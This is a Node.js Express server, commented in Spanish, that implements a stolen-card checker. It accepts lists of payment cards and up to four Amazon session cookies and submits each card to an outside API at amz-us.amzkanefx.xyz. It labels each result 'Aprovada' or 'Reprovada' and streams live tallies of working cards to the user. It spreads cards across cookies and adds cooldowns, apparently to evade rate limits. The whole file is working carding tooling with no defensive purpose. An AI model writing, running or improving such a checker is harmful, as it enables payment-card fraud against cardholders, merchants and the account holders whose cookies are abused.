// server.js
const express = require('express');
const exphbs = require('express-handlebars');
const axios = require('axios');
const app = express();

// Configuración Handlebars
app.engine('hbs', exphbs.engine({ extname: '.hbs', defaultLayout: false }));
app.set('view engine', 'hbs');
app.use(express.json());
app.use(express.static('public'));

// Control de sesiones activas
const activeSessions = new Map();

// Función para esperar un tiempo determinado (cooldown)
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Obtener cooldown según el modo
const getCooldownTime = (mode) => {
    switch (mode) {
        case 1: return 4000; // Modo normal: 1 segundo
        case 2: return 4000; // Modo medio: 1.8 segundos
        case 3: case 4: return 4000; // Modo masivo: 2.5 segundos
        default: return 4000;
    }
};

// Procesador de tarjetas para un nodo (cookie) específico
class CookieNode {
    constructor(cookie, cookieIndex, mode) {
        this.cookie = cookie;
        this.cookieIndex = cookieIndex;
        this.mode = mode;
        this.isProcessing = false;
        this.cooldownTime = getCooldownTime(mode);
        this.queue = [];
        this.results = [];
        this.stopped = false;
    }

    async processCard(card) {
        if (this.stopped) return null;
        
        console.log(`[NODO ${this.cookieIndex + 1}] 🔄 Procesando: ${card}`);
        
        const config = {
            method: 'get',
            url: 'https://amz-us.amzkanefx.xyz/api.php',
            params: { lista: card, cookie: this.cookie },
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            },
            timeout: 30000 // Timeout de 30 segundos
        };
        
        try {
            const response = await axios(config);
            
            if (this.stopped) return null;
            
            const status = response.data.includes('Aprovada') ? 'aprovada' :
                        response.data.includes('Reprovada') ? 'reprovada' :
                        response.data.includes('não detectado') ? 'cookie-error' : 'error';
            
            const statusIcon = status === 'aprovada' ? '✅' : status === 'reprovada' ? '❌' : '⚠️';
            console.log(`[NODO ${this.cookieIndex + 1}] ${statusIcon} ${status.toUpperCase()} - ${card}`);
            
            return {
                status: status,
                card: card,
                message: response.data,
                cookieUsed: this.cookieIndex + 1
            };
        } catch (error) {
            if (this.stopped) return null;
            
            console.log(`[NODO ${this.cookieIndex + 1}] ❌ ERROR: ${error.message} - ${card}`);
            
            return {
                status: 'error',
                card: card,
                message: error.message,
                cookieUsed: this.cookieIndex + 1
            };
        }
    }

    addCard(card) {
        this.queue.push(card);
        if (!this.isProcessing) {
            this.startProcessing();
        }
    }

    async startProcessing() {
        if (this.isProcessing || this.queue.length === 0) return;
        
        this.isProcessing = true;
        
        while (this.queue.length > 0 && !this.stopped) {
            const card = this.queue.shift();
            const result = await this.processCard(card);
            
            if (result && !this.stopped) {
                this.results.push(result);
                
                // Notificar que hay un nuevo resultado disponible
                if (this.onResultCallback) {
                    this.onResultCallback(result);
                }
                
                // Aplicar cooldown solo si quedan tarjetas por procesar
                if (this.queue.length > 0 && !this.stopped) {
                    console.log(`[NODO ${this.cookieIndex + 1}] ⏱️ Cooldown de ${this.cooldownTime}ms`);
                    await sleep(this.cooldownTime);
                }
            }
        }
        
        this.isProcessing = false;
    }

    stop() {
        this.stopped = true;
        this.queue = []; // Limpia la cola de tarjetas pendientes
        console.log(`[NODO ${this.cookieIndex + 1}] 🛑 Procesamiento detenido`);
    }

    onResult(callback) {
        this.onResultCallback = callback;
    }
}

// Endpoint para SSE (Server-Sent Events)
app.get('/stream', (req, res) => {
    // Configurar cabeceras para SSE
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
    });
    
    // Función para enviar un evento SSE al cliente
    const sendEvent = (data) => {
        res.write(`data: ${JSON.stringify(data)}\n\n`);
    };
    
    // Guardar la conexión para enviar eventos
    const clientId = Date.now();
    clients[clientId] = sendEvent;
    
    // Eliminar cliente cuando se cierra la conexión
    req.on('close', () => {
        delete clients[clientId];
    });
});

// Almacenar conexiones SSE activas
const clients = {};

// Función para enviar actualizaciones a todos los clientes conectados
const broadcastUpdate = (data) => {
    Object.values(clients).forEach(sendEvent => {
        sendEvent(data);
    });
};

// Endpoint para detener un proceso
app.post('/stop', (req, res) => {
    const { sessionId } = req.body;
    
    if (!sessionId || !activeSessions.has(sessionId)) {
        return res.status(400).json({ error: 'Sesión no encontrada' });
    }
    
    const session = activeSessions.get(sessionId);
    session.nodes.forEach(node => node.stop());
    
    broadcastUpdate({
        type: 'stopped',
        message: 'Procesamiento detenido por el usuario',
        sessionId
    });
    
    activeSessions.delete(sessionId);
    
    return res.json({ status: 'stopped', message: 'Procesamiento detenido' });
});

// Endpoint único para todos los modos
app.post('/check', async (req, res) => {
    const { cards, cookie1, cookie2, cookie3, cookie4, mode } = req.body;
    
    // Validar parámetros
    if (!cards || !cards.length) {
        return res.status(400).json({ error: 'Faltan tarjetas' });
    }
    
    // Eliminar duplicados para evitar procesamiento repetido
    const uniqueCards = [...new Set(cards)];
    
    // Crear array de cookies disponibles basado en inputs individuales
    const cookies = [];
    if (cookie1) cookies.push(cookie1);
    if (cookie2 && (mode === 2 || mode === 3 || mode === 4)) cookies.push(cookie2);
    if (cookie3 && (mode === 3 || mode === 4)) cookies.push(cookie3);
    if (cookie4 && (mode === 3 || mode === 4)) cookies.push(cookie4);
    
    // Si no hay cookies disponibles, error
    if (cookies.length === 0) {
        return res.status(400).json({ error: 'Falta al menos una cookie' });
    }
    
    // Determinar el número de cookies según el modo
    const cookieCount = cookies.length;
    console.log(`[SISTEMA] 🚀 Iniciando verificación con ${cookieCount} cookie(s) en modo ${mode}`);
    console.log(`[SISTEMA] 📋 Procesando ${uniqueCards.length} tarjetas únicas`);
    
    // Crear nodos de procesamiento para cada cookie
    const nodes = cookies.map((cookie, index) => {
        return new CookieNode(cookie, index, mode);
    });
    
    // Inicializar contadores y arrays para resultados
    let completedResults = 0;
    const allResults = [];
    
    // Estadísticas iniciales
    const stats = {
        total: 0,
        aprovadas: 0,
        reprovadas: 0,
        errors: 0,
        cookieErrors: 0,
        cookiesUsadas: cookieCount,
        modo: mode
    };
    
    // Responder inmediatamente con un ID de sesión
    const sessionId = Date.now().toString();
    
    // Guardar la sesión activa
    activeSessions.set(sessionId, {
        nodes,
        stats,
        totalCards: uniqueCards.length
    });
    
    res.json({ 
        sessionId,
        status: 'processing',
        message: 'Procesamiento iniciado',
        totalCards: uniqueCards.length
    });
    
    // Configurar callback de resultados para cada nodo
    nodes.forEach(node => {
        node.onResult(result => {
            allResults.push(result);
            completedResults++;
            
            // Actualizar estadísticas
            stats.total = completedResults;
            if (result.status === 'aprovada') stats.aprovadas++;
            else if (result.status === 'reprovada') stats.reprovadas++;
            else if (result.status === 'cookie-error') {
                stats.errors++;
                stats.cookieErrors++;
                
                // Notificar error de cookie específicamente
                broadcastUpdate({
                    type: 'cookie-error',
                    message: 'Error de cookie detectado',
                    data: result,
                    sessionId
                });
            }
            else stats.errors++;
            
            // Enviar resultado en tiempo real a todos los clientes conectados
            broadcastUpdate({
                type: 'result',
                data: result,
                stats: { ...stats },
                progress: (completedResults / uniqueCards.length) * 100,
                sessionId
            });
        });
    });
    
    // Distribuir tarjetas entre los nodos según el modo
    for (let i = 0; i < uniqueCards.length; i++) {
        const card = uniqueCards[i];
        
        // Determinar qué nodo (cookie) usar según modo
        let nodeIndex;
        if (mode === 1 || cookieCount === 1) {
            // Modo 1 (Normal): Una cookie para todas las tarjetas
            nodeIndex = 0;
        } else if (mode === 2 && cookieCount >= 2) {
            // Modo 2 (Medio): Dos cookies - 50% para cada una
            nodeIndex = i < (uniqueCards.length / 2) ? 0 : 1;
        } else if ((mode === 3 || mode === 4) && cookieCount >= 4) {
            // Modo 3 (Diablo) o Modo 4 (Flash): Cuatro cookies - 25% para cada una
            nodeIndex = Math.min(Math.floor(i / (uniqueCards.length / 4)), 3);
        } else if ((mode === 3 || mode === 4) && cookieCount === 3) {
            // Si pidió modo 3/4 pero solo hay 3 cookies
            nodeIndex = i % 3;
        } else if ((mode === 3 || mode === 4) && cookieCount === 2) {
            // Si pidió modo 3/4 pero solo hay 2 cookies
            nodeIndex = i % 2;
        } else if (mode === 2 && cookieCount === 1) {
            // Si pidió modo 2 pero solo hay 1 cookie
            nodeIndex = 0;
        }
        
        // Si el índice excede el número de cookies disponibles, usar la última
        if (nodeIndex >= cookieCount) {
            nodeIndex = cookieCount - 1;
        }
        
        // Añadir la tarjeta al nodo correspondiente
        nodes[nodeIndex].addCard(card);
    }
    
    // Procesar fallbacks con la primera cookie si hay errores
    const processAllResults = async () => {
        try {
            // Esperar a que se completen todos los resultados iniciales
            while (completedResults < uniqueCards.length && !nodes.some(node => node.stopped)) {
                await sleep(500);
            }
            
            // Si se detuvo el proceso, salir
            if (nodes.some(node => node.stopped)) {
                broadcastUpdate({
                    type: 'stopped',
                    message: 'Procesamiento detenido por el usuario',
                    sessionId
                });
                return;
            }
            
            // Procesar errores con fallback si es necesario
            const finalResults = [];
            const nodeFallbacks = [];
            
            // Primero procesar los resultados exitosos
            for (const result of allResults) {
                if (result.status !== 'error') {
                    finalResults.push(result);
                } else {
                    // Si hay una cookie diferente disponible para fallback
                    if (cookieCount > 1) {
                        nodeFallbacks.push(result);
                    } else {
                        finalResults.push(result);
                    }
                }
            }
            
            // Procesar fallbacks con la primera cookie si hay errores y más de una cookie
            if (nodeFallbacks.length > 0 && cookieCount > 1) {
                const fallbackNode = new CookieNode(cookies[0], 0, mode);
                let fallbackResults = [];
                
                // Configurar callback de resultados para el nodo de fallback
                fallbackNode.onResult(result => {
                    result.wasBackup = true;
                    fallbackResults.push(result);
                    
                    // Actualizar estadísticas
                    if (result.status === 'aprovada') stats.aprovadas++;
                    else if (result.status === 'reprovada') stats.reprovadas++;
                    else if (result.status === 'cookie-error') {
                        // No restar error anterior para cookie-error
                        stats.cookieErrors++;
                        
                        // Notificar error de cookie específicamente
                        broadcastUpdate({
                            type: 'cookie-error',
                            message: 'Error de cookie detectado en fallback',
                            data: result,
                            sessionId
                        });
                    }
                    else stats.errors--;  // Restar el error anterior
                    
                    // Enviar resultado en tiempo real
                    broadcastUpdate({
                        type: 'result',
                        data: result,
                        stats: { ...stats },
                        progress: 100,  // Ya completamos el progreso normal
                        isBackup: true,
                        sessionId
                    });
                });
                
                // Añadir todas las tarjetas fallidas al nodo de fallback
                for (const failedResult of nodeFallbacks) {
                    console.log(`[SISTEMA] 🔄 Intentando con cookie de respaldo para ${failedResult.card}`);
                    fallbackNode.addCard(failedResult.card);
                }
                
                // Esperar a que terminen todos los fallbacks
                await new Promise(resolve => {
                    const checkInterval = setInterval(() => {
                        if (fallbackResults.length === nodeFallbacks.length || fallbackNode.stopped) {
                            clearInterval(checkInterval);
                            resolve();
                        }
                    }, 500);
                });
                
                // Añadir resultados de fallback
                finalResults.push(...fallbackResults);
            }
            
            // Notificar que el proceso está completo
            broadcastUpdate({
                type: 'complete',
                stats: stats,
                sessionId
            });
            
            // Limpiar la sesión activa
            activeSessions.delete(sessionId);
            
            console.log(`[SISTEMA] ✅ Verificación completa: ${stats.aprovadas} aprobadas, ${stats.reprovadas} rechazadas, ${stats.errors} errores`);
        } catch (err) {
            console.error('[SISTEMA] ❌ Error en procesamiento:', err);
            broadcastUpdate({
                type: 'error',
                message: 'Error en el procesamiento',
                sessionId
            });
            activeSessions.delete(sessionId);
        }
    };
    
    // Iniciar el proceso asíncrono
    processAllResults().catch(err => {
        console.error('[SISTEMA] ❌ Error en procesamiento:', err);
        broadcastUpdate({
            type: 'error',
            message: 'Error en el procesamiento',
            sessionId
        });
        activeSessions.delete(sessionId);
    });
});

app.get('/', (req, res) => res.render('index'));
app.listen(3000, () => console.log('🚀 Servidor activo en puerto 3000'));